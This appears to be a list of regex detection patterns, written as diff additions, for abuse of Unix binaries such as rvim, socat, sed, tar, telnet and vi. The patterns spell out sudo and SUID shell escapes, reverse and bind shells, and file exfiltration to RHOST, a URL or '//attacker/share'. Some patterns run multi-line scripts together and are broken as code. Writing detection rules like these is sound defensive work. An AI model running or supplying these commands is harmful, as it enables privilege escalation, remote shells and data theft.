+rvim -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(k\.bind\("\*"\,os\.getenv\("LPORT"\)\)\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:accept\(\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;    local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(f:read\("\*a"\)\)\;c:send\(b\)\;  end\;c:close\(\)\;f:close\(\)\;'
+rvim -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r\, urllib\.parse as uelse: import urllib as u\, urllib2 as rr\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)vim\.command\(":q!"\)'
+rvim -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import http\.server as s\, socketserver as sselse: import SimpleHTTPServer as s\, SocketServer as ssss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)vim\.command\(":q!"\)'
+rvim -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.open\(os\.getenv\("LFILE"\)\, 'rb'\)  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:read\("\*a"\)  io\.close\(f\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\("RHOST"\)\,os\.getenv\("RPORT"\)\)\;  t:send\(d\)\;  t:close\(\)\;'
+rvim -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as relse: import urllib as rr\.urlretrieve\(e"URL"\, e"LFILE"\)vim\.command\(":q!"\)'
+rvim -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(k\.bind\("\*"\,os\.getenv\("LPORT"\)\)\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:accept\(\)\;  local d\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\("\*a"\)\;  c:close\(\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.open\(os\.getenv\("LFILE"\)\, "wb"\)\;  f:write\(d\)\;  io\.close\(f\)\;'
+rvim -c ':py import vim\; from ctypes import cdll\; cdll\.LoadLibrary\("lib\.so"\)\; vim\.command\(":q!"\)'
+\./rvim -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-pc"\, "reset\; exec sh -p"\)'
+sudo rvim -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+sudo rvim -c ':lua os\.execute\("reset\; exec sh"\)'
+sudo setcap cap_setuid\+ep rvim
+\./rvim -c ':py import os\; os\.setuid\(0\)\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+\./rvim -c ':lua os\.execute\("reset\; exec sh"\)'
+chmod \+x "\$[A-Z_]+"|chmod \+x "http\w:[\w\.\/\?\=\&\%]+"|chmod \+x "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+scp -S \$[A-Z_]+ x y:|scp -S [ a-z0-9A-Z\.\-\/\'\"_\@]+ x y:|scp -S http\w:[\w\.\/\?\=\&\%]+ x y:
+scp [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|scp \$[A-Z_]+ \$[A-Z_]+|scp http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+
+scp [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|scp \$[A-Z_]+ \$[A-Z_]+|scp http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+
+chmod \+x "\$[A-Z_]+"|chmod \+x "http\w:[\w\.\/\?\=\&\%]+"|chmod \+x "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+sudo scp -S [ a-z0-9A-Z\.\-\/\'\"_\@]+ x y:|sudo scp -S \$[A-Z_]+ x y:|sudo scp -S http\w:[\w\.\/\?\=\&\%]+ x y:
+chmod \+x "\$[A-Z_]+"|chmod \+x "http\w:[\w\.\/\?\=\&\%]+"|chmod \+x "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./scp -S \$[A-Z_]+ a b:|\./scp -S [ a-z0-9A-Z\.\-\/\'\"_\@]+ a b:|\./scp -S http\w:[\w\.\/\?\=\&\%]+ a b:
+screen -L -Logfile [ a-z0-9A-Z\.\-\/\'\"_\@]+ echo DATA|screen -L -Logfile \$[A-Z_]+ echo DATA|screen -L -Logfile http\w:[\w\.\/\?\=\&\%]+ echo DATA
+screen -L \$[A-Z_]+ echo DATA|screen -L [ a-z0-9A-Z\.\-\/\'\"_\@]+ echo DATA|screen -L http\w:[\w\.\/\?\=\&\%]+ echo DATA
+script -q /dev/null
+script -q -c 'echo DATA' [\w\-_\/]+
+sudo script -q /dev/null
+sed -n '1e exec sh 1>&0' /etc/hosts
+sed -n '1e id' /etc/hosts
+sed -n "1s/\.\*/DATA/w \$[A-Z_]+" /etc/hosts|sed -n "1s/\.\*/DATA/w http\w:[\w\.\/\?\=\&\%]+" /etc/hosts|sed -n "1s/\.\*/DATA/w [ a-z0-9A-Z\.\-\/\'\"_\@]+" /etc/hosts
+sed '' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sed '' "http\w:[\w\.\/\?\=\&\%]+"|sed '' "\$[A-Z_]+"
+\./sed -e '' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./sed -e '' "\$[A-Z_]+"|\./sed -e '' "http\w:[\w\.\/\?\=\&\%]+"
+sudo sed -n '1e exec sh 1>&0' /etc/hosts
+sudo service \.\./\.\./bin/sh
+setarch \$\(arch\) /bin/sh
+\./setarch \$\(arch\) /bin/sh -p
+sudo setarch \$\(arch\) /bin/sh
+put [\w\-_\/]+ [\w\-_\/]+
+get [\w\-_\/]+ [\w\-_\/]+
+sudo sftp [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo sftp \$[A-Z_]+|sudo sftp http\w:[\w\.\/\?\=\&\%]+
+sg \$\(id -ng\)
+sudo sg root
+shuf -e DATA -o "http\w:[\w\.\/\?\=\&\%]+"|shuf -e DATA -o "\$[A-Z_]+"|shuf -e DATA -o "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+shuf -z "\$[A-Z_]+"|shuf -z "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|shuf -z "http\w:[\w\.\/\?\=\&\%]+"
+\./shuf -e DATA -o "\$[A-Z_]+"|\./shuf -e DATA -o "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./shuf -e DATA -o "http\w:[\w\.\/\?\=\&\%]+"
+sudo shuf -e DATA -o "http\w:[\w\.\/\?\=\&\%]+"|sudo shuf -e DATA -o "\$[A-Z_]+"|sudo shuf -e DATA -o "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+slsh -e 'system\("/bin/sh"\)'
+sudo slsh -e 'system\("/bin/sh"\)'
+\./slsh -e 'system\("/bin/sh"\)'
+smbclient '//attacker/share' -c 'put [\w\-_\/]+ [\w\-_\/]+'
+smbclient '//attacker/share' -c 'put [\w\-_\/]+ [\w\-_\/]+'
+sudo smbclient '//[\w\-_\/]+'
+socat stdin exec:/bin/sh
+socat tcp-connect:[ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+ exec:/bin/sh\,pty\,stderr\,setsid\,sigint\,sane|socat tcp-connect:\$[A-Z_]+:\$[A-Z_]+ exec:/bin/sh\,pty\,stderr\,setsid\,sigint\,sane|socat tcp-connect:http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+ exec:/bin/sh\,pty\,stderr\,setsid\,sigint\,sane
+socat TCP-LISTEN:\$[A-Z_]+\,reuseaddr\,fork EXEC:/bin/sh\,pty\,stderr\,setsid\,sigint\,sane|socat TCP-LISTEN:[ a-z0-9A-Z\.\-\/\'\"_\@]+\,reuseaddr\,fork EXEC:/bin/sh\,pty\,stderr\,setsid\,sigint\,sane|socat TCP-LISTEN:http\w:[\w\.\/\?\=\&\%]+\,reuseaddr\,fork EXEC:/bin/sh\,pty\,stderr\,setsid\,sigint\,sane
+socat -u file:http\w:[\w\.\/\?\=\&\%]+ tcp-connect:http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+|socat -u file:\$[A-Z_]+ tcp-connect:\$[A-Z_]+:\$[A-Z_]+|socat -u file:[ a-z0-9A-Z\.\-\/\'\"_\@]+ tcp-connect:[ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+
+socat -u tcp-connect:\$[A-Z_]+:\$[A-Z_]+ open:\$[A-Z_]+\,creat|socat -u tcp-connect:[ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+ open:[ a-z0-9A-Z\.\-\/\'\"_\@]+\,creat|socat -u tcp-connect:http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+ open:http\w:[\w\.\/\?\=\&\%]+\,creat
+sudo socat stdin exec:/bin/sh
+\./socat tcp-connect:\$[A-Z_]+:\$[A-Z_]+ exec:/bin/sh\,pty\,stderr\,setsid\,sigint\,sane|\./socat tcp-connect:http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+ exec:/bin/sh\,pty\,stderr\,setsid\,sigint\,sane|\./socat tcp-connect:[ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+ exec:/bin/sh\,pty\,stderr\,setsid\,sigint\,sane
+sudo soelim "\$[A-Z_]+"|sudo soelim "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo soelim "http\w:[\w\.\/\?\=\&\%]+"
+sort -m "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sort -m "http\w:[\w\.\/\?\=\&\%]+"|sort -m "\$[A-Z_]+"
+\./sort -m "\$[A-Z_]+"|\./sort -m "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./sort -m "http\w:[\w\.\/\?\=\&\%]+"
+sudo sort -m "http\w:[\w\.\/\?\=\&\%]+"|sudo sort -m "\$[A-Z_]+"|sudo sort -m "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+split http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+|split \$[A-Z_]+ \$[A-Z_]+|split [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sqlite3 /dev/null '\.shell /bin/sh'
+sqlite3 /dev/null -cmd "\.output [ a-z0-9A-Z\.\-\/\'\"_\@]+" 'select "DATA"\;'|sqlite3 /dev/null -cmd "\.output \$[A-Z_]+" 'select "DATA"\;'|sqlite3 /dev/null -cmd "\.output http\w:[\w\.\/\?\=\&\%]+" 'select "DATA"\;'
+sqlite3 << EOF
+CREATE TABLE t\(line TEXT\)\;
+\.import [ a-z0-9A-Z\.\-\/\'\"_\@]+ t|\.import \$[A-Z_]+ t|\.import http\w:[\w\.\/\?\=\&\%]+ t
+SELECT \* FROM t\;
+sqlite3 << EOF
+CREATE TABLE t\(line TEXT\)\;
+\.import [ a-z0-9A-Z\.\-\/\'\"_\@]+ t|\.import \$[A-Z_]+ t|\.import http\w:[\w\.\/\?\=\&\%]+ t
+SELECT \* FROM t\;
+sudo sqlite3 /dev/null '\.shell /bin/sh'
+\./sqlite3 /dev/null '\.shell /bin/sh'
+ss -a -F http\w:[\w\.\/\?\=\&\%]+|ss -a -F \$[A-Z_]+|ss -a -F [ a-z0-9A-Z\.\-\/\'\"_\@]+
+\./ss -a -F http\w:[\w\.\/\?\=\&\%]+|\./ss -a -F \$[A-Z_]+|\./ss -a -F [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo ss -a -F http\w:[\w\.\/\?\=\&\%]+|sudo ss -a -F \$[A-Z_]+|sudo ss -a -F [ a-z0-9A-Z\.\-\/\'\"_\@]+
+ssh-keyscan -f \$[A-Z_]+|ssh-keyscan -f [ a-z0-9A-Z\.\-\/\'\"_\@]+|ssh-keyscan -f http\w:[\w\.\/\?\=\&\%]+
+\./ssh-keyscan -f \$[A-Z_]+|\./ssh-keyscan -f [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./ssh-keyscan -f http\w:[\w\.\/\?\=\&\%]+
+sudo ssh-keyscan -f \$[A-Z_]+|sudo ssh-keyscan -f http\w:[\w\.\/\?\=\&\%]+|sudo ssh-keyscan -f [ a-z0-9A-Z\.\-\/\'\"_\@]+
+ssh localhost [ a-z0-9A-Z\.\-\/\'\"_\@]+ --noprofile --norc|ssh localhost http\w:[\w\.\/\?\=\&\%]+ --noprofile --norc|ssh localhost \$[A-Z_]+ --noprofile --norc
+ssh \$[A-Z_]+ "cat > \$[A-Z_]+" < \$[A-Z_]+|ssh http\w:[\w\.\/\?\=\&\%]+ "cat > http\w:[\w\.\/\?\=\&\%]+" < http\w:[\w\.\/\?\=\&\%]+|ssh [ a-z0-9A-Z\.\-\/\'\"_\@]+ "cat > [ a-z0-9A-Z\.\-\/\'\"_\@]+" < [ a-z0-9A-Z\.\-\/\'\"_\@]+
+ssh \$[A-Z_]+ "cat \$[A-Z_]+" > \$[A-Z_]+|ssh http\w:[\w\.\/\?\=\&\%]+ "cat http\w:[\w\.\/\?\=\&\%]+" > http\w:[\w\.\/\?\=\&\%]+|ssh [ a-z0-9A-Z\.\-\/\'\"_\@]+ "cat [ a-z0-9A-Z\.\-\/\'\"_\@]+" > [ a-z0-9A-Z\.\-\/\'\"_\@]+
+ssh -F [ a-z0-9A-Z\.\-\/\'\"_\@]+ localhost|ssh -F \$[A-Z_]+ localhost|ssh -F http\w:[\w\.\/\?\=\&\%]+ localhost
+start-stop-daemon -n \$[A-Z_]+ -S -x /bin/sh|start-stop-daemon -n http\w:[\w\.\/\?\=\&\%]+ -S -x /bin/sh|start-stop-daemon -n [ a-z0-9A-Z\.\-\/\'\"_\@]+ -S -x /bin/sh
+\./start-stop-daemon -n http\w:[\w\.\/\?\=\&\%]+ -S -x /bin/sh -- -p|\./start-stop-daemon -n [ a-z0-9A-Z\.\-\/\'\"_\@]+ -S -x /bin/sh -- -p|\./start-stop-daemon -n \$[A-Z_]+ -S -x /bin/sh -- -p
+sudo start-stop-daemon -n [ a-z0-9A-Z\.\-\/\'\"_\@]+ -S -x /bin/sh|sudo start-stop-daemon -n http\w:[\w\.\/\?\=\&\%]+ -S -x /bin/sh|sudo start-stop-daemon -n \$[A-Z_]+ -S -x /bin/sh
+stdbuf -i0 /bin/sh
+\./stdbuf -i0 /bin/sh -p
+sudo stdbuf -i0 /bin/sh
+strace -o /dev/null /bin/sh
+\./strace -o /dev/null /bin/sh -p
+sudo strace -o /dev/null /bin/sh
+sudo strings "http\w:[\w\.\/\?\=\&\%]+"|sudo strings "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo strings "\$[A-Z_]+"
+/usr/sbin/sysctl -n "/\.\./\.\./[ a-z0-9A-Z\.\-\/\'\"_\@]+"|/usr/sbin/sysctl -n "/\.\./\.\./\$[A-Z_]+"|/usr/sbin/sysctl -n "/\.\./\.\./http\w:[\w\.\/\?\=\&\%]+"
+\./sysctl -n "/\.\./\.\./http\w:[\w\.\/\?\=\&\%]+"|\./sysctl -n "/\.\./\.\./[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./sysctl -n "/\.\./\.\./\$[A-Z_]+"
+sudo sysctl -n "/\.\./\.\./[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo sysctl -n "/\.\./\.\./http\w:[\w\.\/\?\=\&\%]+"|sudo sysctl -n "/\.\./\.\./\$[A-Z_]+"
+[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+> /tmp/output"[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.target' > [ a-z0-9A-Z\.\-\/\'\"_\@]+\./systemctl link [ a-z0-9A-Z\.\-\/\'\"_\@]+\./systemctl enable --now [ a-z0-9A-Z\.\-\/\'\"_\@]+|[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+> /tmp/output"[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.target' > \$[A-Z_]+\./systemctl link \$[A-Z_]+\./systemctl enable --now \$[A-Z_]+|[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+> /tmp/output"[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.target' > http\w:[\w\.\/\?\=\&\%]+\./systemctl link http\w:[\w\.\/\?\=\&\%]+\./systemctl enable --now http\w:[\w\.\/\?\=\&\%]+
+echo /bin/sh >\$[A-Z_]+|echo /bin/sh >http\w:[\w\.\/\?\=\&\%]+|echo /bin/sh >[ a-z0-9A-Z\.\-\/\'\"_\@]+
+chmod \+x \$[A-Z_]+|chmod \+x http\w:[\w\.\/\?\=\&\%]+|chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+
+[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+> /tmp/output"[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.target' > [ a-z0-9A-Z\.\-\/\'\"_\@]+sudo systemctl link [ a-z0-9A-Z\.\-\/\'\"_\@]+sudo systemctl enable --now [ a-z0-9A-Z\.\-\/\'\"_\@]+|[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+> /tmp/output"[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.target' > http\w:[\w\.\/\?\=\&\%]+sudo systemctl link http\w:[\w\.\/\?\=\&\%]+sudo systemctl enable --now http\w:[\w\.\/\?\=\&\%]+|[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+> /tmp/output"[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.target' > \$[A-Z_]+sudo systemctl link \$[A-Z_]+sudo systemctl enable --now \$[A-Z_]+
+tac -s 'RANDOM' "\$[A-Z_]+"|tac -s 'RANDOM' "http\w:[\w\.\/\?\=\&\%]+"|tac -s 'RANDOM' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./tac -s 'RANDOM' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./tac -s 'RANDOM' "\$[A-Z_]+"|\./tac -s 'RANDOM' "http\w:[\w\.\/\?\=\&\%]+"
+sudo tac -s 'RANDOM' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo tac -s 'RANDOM' "http\w:[\w\.\/\?\=\&\%]+"|sudo tac -s 'RANDOM' "\$[A-Z_]+"
+tail -c1G "\$[A-Z_]+"|tail -c1G "http\w:[\w\.\/\?\=\&\%]+"|tail -c1G "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./tail -c1G "http\w:[\w\.\/\?\=\&\%]+"|\./tail -c1G "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./tail -c1G "\$[A-Z_]+"
+sudo tail -c1G "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo tail -c1G "http\w:[\w\.\/\?\=\&\%]+"|sudo tail -c1G "\$[A-Z_]+"
+tar -cf /dev/null /dev/null [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+
+tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
+echo '/bin/sh 0<&1' > "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|echo '/bin/sh 0<&1' > "http\w:[\w\.\/\?\=\&\%]+"|echo '/bin/sh 0<&1' > "\$[A-Z_]+"
+tar cf "http\w:[\w\.\/\?\=\&\%]+\.tar" "http\w:[\w\.\/\?\=\&\%]+"|tar cf "\$[A-Z_]+\.tar" "\$[A-Z_]+"|tar cf "[ a-z0-9A-Z\.\-\/\'\"_\@]+\.tar" "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+tar xf "\$[A-Z_]+\.tar" --to-command sh|tar xf "[ a-z0-9A-Z\.\-\/\'\"_\@]+\.tar" --to-command sh|tar xf "http\w:[\w\.\/\?\=\&\%]+\.tar" --to-command sh
+tar c --xform "s@\.\*@http\w:[\w\.\/\?\=\&\%]+@" -OP "http\w:[\w\.\/\?\=\&\%]+" \| tar x -P|tar c --xform "s@\.\*@[ a-z0-9A-Z\.\-\/\'\"_\@]+@" -OP "[ a-z0-9A-Z\.\-\/\'\"_\@]+" \| tar x -P|tar c --xform "s@\.\*@\$[A-Z_]+@" -OP "\$[A-Z_]+" \| tar x -P
+tar xf "http\w:[\w\.\/\?\=\&\%]+" -I '/bin/sh -c "cat 1>&2"'|tar xf "\$[A-Z_]+" -I '/bin/sh -c "cat 1>&2"'|tar xf "[ a-z0-9A-Z\.\-\/\'\"_\@]+" -I '/bin/sh -c "cat 1>&2"'
+sudo tar -cf /dev/null /dev/null [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+
+\./tar -cf /dev/null /dev/null [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+
+taskset 1 /bin/sh
+\./taskset 1 /bin/sh -p
+sudo taskset 1 /bin/sh
+sudo tbl http\w:[\w\.\/\?\=\&\%]+|sudo tbl [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo tbl \$[A-Z_]+
+exec /bin/sh <@stdin >@stdout 2>@stderr
+exec /bin/sh -p <@stdin >@stdout 2>@stderr
+exec /bin/sh <@stdin >@stdout 2>@stderr
+chmod \+x \$[A-Z_]+|chmod \+x http\w:[\w\.\/\?\=\&\%]+|chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+
+tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z [ a-z0-9A-Z\.\-\/\'\"_\@]+|tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z http\w:[\w\.\/\?\=\&\%]+|tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z \$[A-Z_]+
+chmod \+x \$[A-Z_]+|chmod \+x http\w:[\w\.\/\?\=\&\%]+|chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z [ a-z0-9A-Z\.\-\/\'\"_\@]+ -Z root|sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z http\w:[\w\.\/\?\=\&\%]+ -Z root|sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z \$[A-Z_]+ -Z root
+telnet \$[A-Z_]+ \$[A-Z_]+|telnet [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|telnet http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+
+mkfifo [ a-z0-9A-Z\.\-\/\'\"_\@]+ && telnet [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+ 0<[ a-z0-9A-Z\.\-\/\'\"_\@]+ \| /bin/sh 1>[ a-z0-9A-Z\.\-\/\'\"_\@]+|mkfifo \$[A-Z_]+ && telnet \$[A-Z_]+ \$[A-Z_]+ 0<\$[A-Z_]+ \| /bin/sh 1>\$[A-Z_]+|mkfifo http\w:[\w\.\/\?\=\&\%]+ && telnet http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+ 0<http\w:[\w\.\/\?\=\&\%]+ \| /bin/sh 1>http\w:[\w\.\/\?\=\&\%]+
+sudo telnet \$[A-Z_]+ \$[A-Z_]+|sudo telnet [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo telnet http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+
+\./telnet http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+|\./telnet \$[A-Z_]+ \$[A-Z_]+|\./telnet [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo tftp \$[A-Z_]+|sudo tftp http\w:[\w\.\/\?\=\&\%]+|sudo tftp [ a-z0-9A-Z\.\-\/\'\"_\@]+
+\./time /bin/sh -p
+sudo /usr/bin/time /bin/sh
+timeout 7d /bin/sh
+\./timeout 7d /bin/sh -p
+sudo timeout --foreground 7d /bin/sh
+echo -e 'pipe/tx/texec /bin/sh 1>&0 2>&0' >>~/\.config/procps/toprctop
+echo -e 'pipe/tx/texec /bin/sh 1>&0 2>&0' >>/root/\.config/procps/toprcsudo top
+sudo troff http\w:[\w\.\/\?\=\&\%]+|sudo troff \$[A-Z_]+|sudo troff [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo ul "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo ul "http\w:[\w\.\/\?\=\&\%]+"|sudo ul "\$[A-Z_]+"
+unexpand -t99999999 "http\w:[\w\.\/\?\=\&\%]+"|unexpand -t99999999 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|unexpand -t99999999 "\$[A-Z_]+"
+\./unexpand -t99999999 "\$[A-Z_]+"|\./unexpand -t99999999 "http\w:[\w\.\/\?\=\&\%]+"|\./unexpand -t99999999 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+sudo unexpand -t99999999 "http\w:[\w\.\/\?\=\&\%]+"|sudo unexpand -t99999999 "\$[A-Z_]+"|sudo unexpand -t99999999 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+sudo uniq "\$[A-Z_]+"|sudo uniq "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo uniq "http\w:[\w\.\/\?\=\&\%]+"
+\./unshare -r /bin/sh
+sudo unshare /bin/sh
+\./update-alternatives --force --install "[ a-z0-9A-Z\.\-\/\'\"_\@]+" x "[ a-z0-9A-Z\.\-\/\'\"_\@]+" 0|\./update-alternatives --force --install "\$[A-Z_]+" x "\$[A-Z_]+" 0|\./update-alternatives --force --install "http\w:[\w\.\/\?\=\&\%]+" x "http\w:[\w\.\/\?\=\&\%]+" 0
+sudo update-alternatives --force --install "\$[A-Z_]+" x "\$[A-Z_]+" 0|sudo update-alternatives --force --install "[ a-z0-9A-Z\.\-\/\'\"_\@]+" x "[ a-z0-9A-Z\.\-\/\'\"_\@]+" 0|sudo update-alternatives --force --install "http\w:[\w\.\/\?\=\&\%]+" x "http\w:[\w\.\/\?\=\&\%]+" 0
+uuencode "http\w:[\w\.\/\?\=\&\%]+" /dev/stdout \| uudecode|uuencode "[ a-z0-9A-Z\.\-\/\'\"_\@]+" /dev/stdout \| uudecode|uuencode "\$[A-Z_]+" /dev/stdout \| uudecode
+uuencode "http\w:[\w\.\/\?\=\&\%]+" /dev/stdout \| uudecode|uuencode "[ a-z0-9A-Z\.\-\/\'\"_\@]+" /dev/stdout \| uudecode|uuencode "\$[A-Z_]+" /dev/stdout \| uudecode
+sudo uuencode "[ a-z0-9A-Z\.\-\/\'\"_\@]+" /dev/stdout \| uudecode|sudo uuencode "http\w:[\w\.\/\?\=\&\%]+" /dev/stdout \| uudecode|sudo uuencode "\$[A-Z_]+" /dev/stdout \| uudecode
+uuencode "http\w:[\w\.\/\?\=\&\%]+" /dev/stdout \| uudecode|uuencode "[ a-z0-9A-Z\.\-\/\'\"_\@]+" /dev/stdout \| uudecode|uuencode "\$[A-Z_]+" /dev/stdout \| uudecode
+uuencode "http\w:[\w\.\/\?\=\&\%]+" /dev/stdout \| uudecode|uuencode "[ a-z0-9A-Z\.\-\/\'\"_\@]+" /dev/stdout \| uudecode|uuencode "\$[A-Z_]+" /dev/stdout \| uudecode
+sudo uuencode "[ a-z0-9A-Z\.\-\/\'\"_\@]+" /dev/stdout \| uudecode|sudo uuencode "http\w:[\w\.\/\?\=\&\%]+" /dev/stdout \| uudecode|sudo uuencode "\$[A-Z_]+" /dev/stdout \| uudecode
+sudo valgrind /bin/sh
+vi -c ':!/bin/sh' /dev/null
+sudo vi -c ':!/bin/sh' /dev/null
+view -c ':!/bin/sh'
+view -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+view -c ':lua os\.execute\("reset\; exec sh"\)'
